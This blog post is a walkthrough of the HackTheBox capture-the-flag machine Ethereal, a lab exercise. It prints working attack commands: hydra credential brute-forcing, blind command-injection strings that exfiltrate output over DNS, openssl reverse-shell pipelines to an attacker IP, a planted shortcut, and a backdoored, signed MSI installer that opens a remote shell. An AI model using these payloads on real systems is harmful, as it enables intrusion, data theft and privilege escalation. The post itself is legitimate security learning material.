---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-03-09-ethereal-hackthebox
tags:
- command injection
- hackthebox
- msi signing
- testdisk
- windows
title: Ethereal @ HackTheBox
---

Ethereal is a machine on [hackthebox.eu](https://www.hackthebox.eu) that awards 50 points, the highest possible score/difficulty and requires some really fun techniques, teaching me several new things along the way. It features extracting files from a disk image, password guessing, blind command injection, openssl reverse shells, msi backdooring & signing of executables on windows.

## User Flag

The initial nmap scan shows the following ports:

```
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I started by checking the website but found nothing interesting besides some trolling attempts. However FTP can be accessed anonymously and has a lot of content:

```
07-10-18  09:03PM       <DIR>          binaries
09-02-09  08:58AM                 4122 CHIPSET.txt
01-12-03  08:58AM              1173879 DISK1.zip
01-22-11  08:58AM               182396 edb143en.exe
01-18-11  11:05AM                98302 FDISK.zip
07-10-18  08:59PM       <DIR>          New folder
07-10-18  09:38PM       <DIR>          New folder (2)
07-09-18  09:23PM       <DIR>          subversion-1.10.0
11-12-16  08:58AM                 4126 teamcity-server-log4j.xml
```

In the FDISK.zip archive we find a file called "FDISK" which appears to be a disk image:

```
FDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FAT
```

We open it with `testdisk` and see that it contains a single folder called PBOX:

![](htb_ethereal_testdisk.png)

After extracting the folder we examine the PBOX.exe binary with `file` and notice that it is a ms-dos binary. Searching for tool online we find that PBOX is an old password manager. We start `dosbox` and mount the PBOX folder with `mount c PBOX`. When running PBOX.exe inside dosbox it immediately asks for a master password before starting up properly, so we try several default passwords and eventually get the right one with "password". We can now view the password entries in the manager:

![](htb_ethereal_pbox.png)

Dumping every entry results in the following credentials:

```
databases: 7oth3B@tC4v3!
msdn: alan@ethereal.co / P@ssword1!
learning: alan2 / learn!ng!
ftp drop: Watch3r
backup: alan / Ex3cutiv3Backups
websiteuploads: R3lea5eR3@dy#
truecrypt: Password8
management server: !C414m17y57r1k3s4g41n!
svn: alan53: Ch3ck1ToU7>
```

On port 8080 we have a login where we can try them out. To save some time I used hydra to try all possible combinations of the obtained credentials:

```
hydra -L user.txt -P pass.txt -s 8080 ethereal.htb http-get / 
[8080][http-get] host: ethereal.htb   login: alan   password: !C414m17y57r1k3s4g41n!
```

We get a new website which can be used to test your connection by entering an ip address, triggering the ping command on submit. This seems like a classic place for command injection. However trying several different injection strings leads to no visible results.

To confirm that we have indeed a way of injection commands we send `10.10.14.4 && ping 10.10.14.4` and inspect the traffic in wireshark, which shows that our host is being pinged twice! This means we have blind command injection as we can not see any direct results. To actually see the results of our commands we have to use a side channel to retrieve the responses. Trying various ways to get responses back we finally find that it is possible to get DNS queries from the host when we issue a command like this: `nslookup "xct" 10.10.14.4`, which looks up the record "xct" on our attacker box. If we can replace the string "xct" with the output of a command we can get its output back from the server. To achieve that I decided on the following command:

```
p||(for /F "tokens=1,2,3,4,5,6,7,8,9,10" %b in ('dir') do nslookup "~!%b--%c--%d--%e--%f--%g--%h--%i--%j--%k~~" 10.10.14.4)
```

This somewhat complicated looking command executes "dir" and tokenizes the output. The string that is actually looked up is all the tokens combined into one large string with "~!" indicating the start, "–" as delimiter and "~~" as end marker. We need the markers to parse the responses in order to get nice human readable output.

We run a [custom dns server](https://gist.github.com/xct/45bc42a181b21ccca3e19f4c8212e1d8) on our attacker box to respond to requests (to avoid timeouts) and parse the answers. With this setup we can execute commands and retrieve the results and start enumerating the box. After some digging around we find that openssl is installed, which is very interesting because openssl can be used to obtain a remote shell. Before we try something in that regard we check the firewall configuration with `netsh advfirewall firewall show rule name=all` and find that tcp ports 73 and 163 are open for outbound communication.

To obtain a shell with openssl we have to pipe the result of openssl to cmd and the result of cmd to back to openssl like this: `openssl.exe s_client -quiet -connect <ip>:73 | cmd.exe | openssl.exe s_client -quiet -connect <ip>:163`, using one of the ports to send commands and the other one to retrieve them.

Starting the shell however fails at this point. To be honest i can’t tell why. After looking around some more we find a note in our current users home folder at "c:/users/alan/Desktop/note-draft.txt". To download the note we use openssl:

```
p||cd "c:/Program Files (x86)/OpenSSL-v1.1.0/bin" && (for /F "tokens=1,2,3,4,5,6,7,8,9,10" %b in ('openssl.exe s_client -connect 10.10.14.4:136 ^< "c:/users/alan/Desktop/note-draft.txt"') do nslookup "~!%b--%c--%d--%e--%f--%g--%h--%i--%j--%k~~" 10.10.14.4)
```

The note has the following content:

```
"I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead."
```

This suggests that we should be able to replace the lnk on the public desktop, resulting in execution of a program of our choice in the context of another user. We create a lnk file on a windows vm and change the path to the openssl shell command mentioned before. Finally we upload the lnk, overwriting the original lnk mentioned in the note:

```
p||cd "c:/Program Files (x86)/OpenSSL-v1.1.0/bin" && (for /F "tokens=1,2,3,4,5,6,7,8,9,10" %b in ('openssl.exe s_client -quiet -connect 10.10.14.4:136 ^> "c:/users/public/desktop/shortcuts/Visual Studio 2017.lnk"') do nslookup "~!%b--%c--%d--%e--%f--%g--%h--%i--%j--%k~~" 10.10.14.4)
```

After waiting a moment we get a shell back as jorge, and can read the user.txt file.

## Root Flag

The usual enumerating shows that we have a drive "d:\\" where we find another note:

```
D:\DEV\MSIs>type note.txt
Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.

- Rupal
```

This strongly suggests that we can build a msi file, sign it with some certificates from the machine and place it here in order get it executed. We find the mentioned certificates here:

```
D:\Certs>dir
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of D:\Certs

07/07/2018  09:50 PM    <DIR>          .
07/07/2018  09:50 PM    <DIR>          ..
07/01/2018  09:26 PM               772 MyCA.cer
07/01/2018  09:26 PM             1,196 MyCA.pvk
               2 File(s)          1,968 bytes
               2 Dir(s)   8,437,514,240 bytes free
```

To create the actual payload we use [wix](http://wixtoolset.org/). To begin we need to create a xml file that describes our installer:

```
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="8e2b6e8e-d8c0-4bdd-930e-5b7428ea9da6" Name="Example Product Name" Version="0.0.1" Manufacturer="xct" Language="1033">
  <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
  <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
  <Directory Id="TARGETDIR" Name="SourceDir">
    <Directory Id="ProgramFilesFolder">
      <Directory Id="INSTALLLOCATION" Name="Example">
        <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-123456789012">
          <File Id="ApplicationFile1" Source="D:\xct\xct.txt"/>
        </Component>
      </Directory>
    </Directory>
  </Directory>
  <Feature Id="DefaultFeature" Level="1">
    <ComponentRef Id="ApplicationFiles"/>
  </Feature>
  <CustomAction Id="Shell" Directory="TARGETDIR" ExeCommand="cmd.exe /c C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.4:73| cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.4:136" Execute="deferred" Impersonate="yes" Return="ignore"/>
  <CustomAction Id="Fail" Execute="deferred" Script="vbscript" Return="check">
    Error
  </CustomAction>
  <InstallExecuteSequence>
  <Custom Action="Shell" After="InstallInitialize"></Custom>
  <Custom Action="Fail" Before="InstallFiles"></Custom>
  </InstallExecuteSequence>
  </Product>
</Wix>
```

This is basically a minimal version of the required xml that defines a custom action that executes the openssl shell as soon as the installer is started (on the "InstallInitialize" event). Notice that in the "ApplicationFiles" part you can specify files that will be included in the installer. The next step is to create wixobj from the xml and then an msi from the wixobj:

```
candle.exe exploit.wxs
light.exe -out exploit.msi exploit.wixobj
```

Now that we have created the msi file we need to sign it. In order to do that we have to take the given ca cert and create a new key that we sign with the ca cert:

```
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>makecert.exe -pe -n "CN=SPC" -a
 sha256 -cy end -sky signature -ic C:\users\xct\Desktop\MyCA.cer -iv C:\Users\xc
t\Desktop\MyCA.pvk -sv C:\users\xct\Desktop\spc.pvk c:\users\xct\Desktop\spc.cer
```

In order to use the newly created cert for signing we need to convert the cert to the pfx file format:

```
pvk2pfx -pvk C:\Users\xct\Desktop\spc.pvk -spc C:\Users\xct\Desktop\spc.cer -pfx C:\Users\xct\Desktop\spc.pfx
```

We can now finally use the pfx file to sign the msi file:

```
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>signtool sign /f c:\Users\xct\Desktop\spc.pfx C:\users\xct\Desktop\exploit.msi
```

We upload the file to the target on `D:\DEV\MSIs>`, exit the current shell and wait for the new shell (as user rupal) to spawn. After a moment we get the shell and can read the root flag! This concludes this box, many thanks to the creators [MinatoTW](https://twitter.com/MinatoTW_) and [egre55](https://twitter.com/egre55).